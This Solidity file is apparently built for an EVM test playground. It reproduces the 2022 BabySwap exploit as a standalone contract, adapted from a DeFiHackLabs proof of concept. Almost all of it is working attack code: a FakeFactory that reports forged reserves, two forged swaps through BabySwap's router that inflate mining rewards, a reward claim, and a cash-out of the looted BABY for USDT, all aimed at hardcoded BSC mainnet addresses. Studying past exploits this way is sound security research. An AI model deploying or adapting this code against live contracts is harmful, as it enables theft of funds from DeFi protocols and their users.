// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-BabySwap).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest is Test` contract: testExploit() deposits 20_000 wei into WBNB,
// approves the router, deploys a FakeFactory, runs two forged swaps through the
// BabySmartRouter aggregation router, calls SwapMining.takerWithdraw(), and
// finally dumps the looted BABY for USDT through the REAL BabySwap factory. The
// FakeFactory and the BABY→USDT cashout live on the test itself. There is no
// standalone contract to deploy, so this file is a faithful, self-contained
// copy of that inline attack (testExploit body → run(); FakeFactory copied
// verbatim; minimal inlined interfaces — no imports so it compiles anywhere).
//
// Root cause: BabySwap's liquidity-mining contract `SwapMining.swap()` credits
// reward weight from a router-reported `amount` that it trusts blindly — it only
// authenticates the messenger via `onlyRouter`, never the message. The
// aggregation `BabySmartRouter` computes `amountOut` from a CALLER-SUPPLIED
// `factories[]` array, so an attacker-deployed FakeFactory returning fake
// reserves `(1e28, 1)` makes the router compute an astronomical `amountOut`
// (9.999e27) and faithfully relay it to SwapMining. Two such forged swaps accrue
// enough reward that a single takerWithdraw() pays out ~1.02M BABY, sold for
// ~24,245 USDT. Real cost: 20,000 wei of WBNB (and even that is returned).

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IBabySwapRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address[] memory factories,
        uint256[] memory fees,
        address to,
        uint256 deadline
    ) external;
}

interface ISwapMining {
    function takerWithdraw() external;
}

contract BabySwapDrain {
    IWBNB internal constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 internal constant USDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant BABY_TOKEN = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    IBabySwapRouter internal constant BABYSWAP_ROUTER =
        IBabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
    ISwapMining internal constant SWAP_MINING =
        ISwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);
    address internal constant BABYSWAP_FACTORY = 0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da;

    function run() external payable {
        // --- Setup: 20_000 wei WBNB working capital (mirrors testExploit). ---
        WBNB_TOKEN.deposit{value: 20_000}();
        WBNB_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);
        BABY_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);

        // Deploy the attacker-controlled FakeFactory (returns fake reserves).
        FakeFactory factory = new FakeFactory();

        address[] memory factories = new address[](1);
        factories[0] = address(factory);
        uint256[] memory fees = new uint256[](1);
        fees[0] = 0;

        // --- Step 1: fake swap WBNB -> USDT through FakeFactory. ---
        // Router reads fake reserves (1e28, 1), computes amountOut = 9.999e27 and
        // reports it to SwapMining.swap(); since USDT == targetToken, the forged
        // amount is credited 1:1 as mining "quantity".
        address[] memory path1 = new address[](2);
        path1[0] = address(WBNB_TOKEN);
        path1[1] = address(USDT_TOKEN);
        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path1, factories, fees, address(this), block.timestamp);

        // --- Step 2: fake swap WBNB -> BABY through FakeFactory. ---
        // Same forged amountOut = 9.999e27 reported; BABY != targetToken, so
        // getQuantity consults the TWAP oracle on the real BABY/USDT pair.
        address[] memory path2 = new address[](2);
        path2[0] = address(WBNB_TOKEN);
        path2[1] = address(BABY_TOKEN);
        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path2, factories, fees, address(this), block.timestamp);

        // --- Step 3: claim the inflated BABY reward (~1.02M BABY). ---
        SWAP_MINING.takerWithdraw();

        // --- Step 4: cash out the looted BABY for USDT through the REAL factory. ---
        _babyToUsdt();
    }

    /**
     * Swap all BABY held by this contract for USDT via the REAL BabySwap factory
     * (0.3% fee), mirroring ContractTest._BABYToUSDT().
     */
    function _babyToUsdt() internal {
        address[] memory path = new address[](2);
        path[0] = address(BABY_TOKEN);
        path[1] = address(USDT_TOKEN);
        address[] memory factories = new address[](1);
        factories[0] = BABYSWAP_FACTORY;
        uint256[] memory fees = new uint256[](1);
        fees[0] = 3000;
        BABYSWAP_ROUTER.swapExactTokensForTokens(
            BABY_TOKEN.balanceOf(address(this)), 0, path, factories, fees, address(this), block.timestamp
        );
    }
}

/// @notice Attacker-controlled factory/pair. The router reads getReserves() and
/// routes the swap through getPair()/swap(), so a fake factory lets the attacker
/// dictate the computed `amountOut` (≈ reserveOut) without moving real value.
contract FakeFactory {
    address public owner;
    IWBNB internal constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    constructor() {
        owner = msg.sender;
    }

    // fake pair
    function getPair(address, /*token1*/ address /*token2*/ ) external view returns (address pair) {
        pair = address(this);
    }

    // fake pair reserves: reserveOut = 1e28, reserveIn = 1 → amountOut ≈ reserveOut.
    function getReserves() external pure returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {
        reserve0 = 10_000_000_000 * 1e18;
        reserve1 = 1;
        blockTimestampLast = 0;
    }

    // fake pair swap: return the dust WBNB the router sent in, so net cost ~0.
    function swap(uint256, /*amount0Out*/ uint256, /*amount1Out*/ address, /*to*/ bytes calldata /*data*/ ) external {
        if (WBNB_TOKEN.balanceOf(address(this)) > 0) {
            WBNB_TOKEN.transfer(owner, WBNB_TOKEN.balanceOf(address(this)));
        }
    }
}
